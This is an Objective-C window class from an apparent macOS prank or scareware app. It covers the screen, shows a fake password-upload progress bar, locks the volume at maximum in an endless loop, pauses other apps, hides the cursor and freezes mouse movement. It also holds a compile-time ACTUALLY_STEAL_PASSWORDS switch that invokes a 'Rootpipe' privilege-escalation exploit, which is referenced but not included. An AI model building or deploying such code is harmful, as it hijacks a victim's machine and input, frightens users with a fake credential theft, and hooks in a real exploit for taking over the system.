//
//  MainWindow.m
//  display
//
//  Created by James Pickering on 11/2/14.
//  Copyright (c) 2014 Novemcinctus. All rights reserved.
//

#import "MainWindow.h"
#import "Rootpipe.h"
#import "AppDelegate.h"

@interface MainWindow () {
    NSRect windowFrame;
    NSRect uploadFrame;
    NSTimeInterval time;
}

@end

@implementation MainWindow

- (id)init {
    
    self = [super init];
    
    windowFrame = NSMakeRect(0, 0, [[NSScreen mainScreen] frame].size.width, [[NSScreen mainScreen] frame].size.height + 100);
    uploadFrame = NSMakeRect([[NSScreen mainScreen] frame].size.width / 2.0 - 300, [[NSScreen mainScreen] frame].size.height / 2.0 - 100, 600, 200);
    time = 27.8;
    
    [self setFrame:windowFrame display:YES];
    [self setStyleMask:NSBorderlessWindowMask];
    [self setBackingType:NSBackingStoreBuffered];
    [self setOpaque:NO];
    [self setBackgroundColor:[NSColor colorWithCalibratedRed:0 green:0 blue:0 alpha:0.7]];
    [self setLevel:CGShieldingWindowLevel()];
    [self makeKeyAndOrderFront:nil];
    [self setMovable:NO];
    [self setMovableByWindowBackground:NO];
    [self addSubviews];
    [self lockVolumeMax];
    [self playMusic];
#ifdef ACTUALLY_STEAL_PASSWORDS
    if ([Rootpipe runExploit]) {
        // The exploit was successful
    }
    else {
        // The exploit failed
    }
#endif
    [self performSelector:@selector(showImage) withObject:self afterDelay:time];
    [AppDelegate pauseApps];
    
    
    return self;
}



- (void)playMusic {
    NSSound *sound = [NSSound soundNamed:@"sound"];
    [sound setLoops:YES];
    [sound play];
}

- (void)addSubviews {
    NSImageView *upload = [[NSImageView alloc] initWithFrame:uploadFrame];
    [upload setImage:[NSImage imageNamed:@"Passwords.png"]];
    
    [self.contentView addSubview:upload];
    
    NSView *progressbar = [[NSView alloc] initWithFrame:NSMakeRect([[NSScreen mainScreen] frame].size.width / 2.0 - 300 + 82, [[NSScreen mainScreen] frame].size.height / 2.0 - 100 + 57, 0, 43)];
    [progressbar setWantsLayer:YES];
    [progressbar.layer setBackgroundColor:[NSColor redColor].CGColor];
    [self.contentView addSubview:progressbar];
    
    [NSAnimationContext runAnimationGroup:^(NSAnimationContext *context) {
        context.duration = time - 1;
        progressbar.animator.frame = NSMakeRect([[NSScreen mainScreen] frame].size.width / 2.0 - 300 + 82, [[NSScreen mainScreen] frame].size.height / 2.0 - 100 + 57, 435, 43);
    } completionHandler:^{
        [progressbar removeFromSuperview];
        [upload setImage:[NSImage imageNamed:@"Complete.png"]];
    }];
}

- (void)setVolumeMax {
    NSAppleScript *changeVolume = [[NSAppleScript alloc] initWithSource:@"set volume 10"];
    [changeVolume executeAndReturnError:nil];
}

- (void)lockVolumeMaxLoop {
    while (1)
        [self setVolumeMax];
}

- (void)lockVolumeMax {
    [self performSelectorInBackground:@selector(lockVolumeMaxLoop) withObject:self];
}

- (void)showImage {
    NSRect frame = NSMakeRect(0, 0, [[NSScreen mainScreen] frame].size.width, [[NSScreen mainScreen] frame].size.height);
    NSImageView *homer = [[NSImageView alloc] initWithFrame:frame];
    [homer setImageScaling:NSImageScaleAxesIndependently];
    [homer setImage:[NSImage imageNamed:@"wtf.gif"]];
    CGDisplayHideCursor (kCGNullDirectDisplay);
    CGAssociateMouseAndMouseCursorPosition (false);
    
    [self.contentView addSubview:homer];
}

- (BOOL) canBecomeKeyWindow { return YES; }
- (BOOL) canBecomeMainWindow { return YES; }
- (BOOL) acceptsFirstResponder { return YES; }
- (BOOL) becomeFirstResponder { return YES; }
- (BOOL) resignFirstResponder { return NO; }

@end
